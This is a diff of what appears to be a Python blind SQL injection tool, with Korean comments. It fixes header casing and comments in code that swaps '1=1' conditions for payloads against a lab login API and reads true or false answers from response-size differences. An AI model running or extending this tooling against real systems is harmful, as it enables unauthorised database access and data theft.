@@ -20,13 +20,13 @@ warnings.filterwarnings('ignore')
 # 전역변수
 output_check = False
 args = None
-false_message_size = None # 참(ture)의 경우 message size
+false_message_size = None # 거짓(False)의 경우 message size
 
 ########################################################################################################
 
 REQUEST_STRING = """
 POST /api/login HTTP/1.1
-host: 192.168.219.100:5001
+Host: 192.168.219.100:5001
 Content-Length: 44
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
 Content-Type: application/json
@@ -228,10 +228,11 @@ def parse_request(request):
 		for line in headers_string.split("\n"):
 			if ":" in line:
 				key, value = line.split(": ")
-				headers[key] = value
+				headers[key.lower()] = value
+				
 		url = headers['host']
 
-		if 'application/json' in headers.get('Content-Type', ''):
+		if headers.get('Content-Type'.lower()) == 'application/json':
 			try:
 				data = json.loads(data_string)  # JSON 파싱
 				condition = url_decode(data[args.parameter])
@@ -372,7 +373,7 @@ def check_condition(data, method, url, path, headers):
 		false_message_size = len(response.content) # 저장
 	else:
 		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
-		if headers.get('Content-Type') == 'application/json':
+		if headers.get('Content-Type'.lower()) == 'application/json':
 			response = requests.request(method, url, headers=headers, json=data, proxies=proxies, timeout=timeout, verify=False)
 			false_message_size = len(response.content) # 저장
 		else:
@@ -411,7 +412,7 @@ def connection(data, method, url, path, headers):
 		check_message_size = len(response.content)
 	else:
 		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
-		if headers.get('Content-Type') == 'application/json':
+		if headers.get('Content-Type'.lower()) == 'application/json':
 			response = requests.request(method, url, headers=headers, json=data, proxies=proxies, timeout=timeout, verify=False)
 			check_message_size = len(response.content)
 		else:
@@ -419,8 +420,8 @@ def connection(data, method, url, path, headers):
 			check_message_size = len(response.content)
 
 	if false_message_size != check_message_size:
-		return 1    # true
-	return 0    # false
+		return 1    # 참(true)
+	return 0    # 거짓(false)
 
 def query_start():
 	row_count = 1 # 행 개수
@@ -434,7 +435,7 @@ def query_start():
 	test= line_delete(REQUEST_STRING)
 
 	data, condition = parse_request(line_delete(REQUEST_STRING)) # 응답데이터 파싱
-	check_condition(**data) # True 응답 길이 저장 (참거짓 구분 용도) 	
+	check_condition(**data) # 거짓(False) 응답 길이 저장 (참거짓 구분 용도) 	
 	result_payload = payload_set(condition, payloads) # 조건식에서 1=1 을 페이로드로 리플레이스
 
 	if args.select_table != None: # 테이블의 컬럼을 여러개 선택하는 경우 ex) -C blog, movies
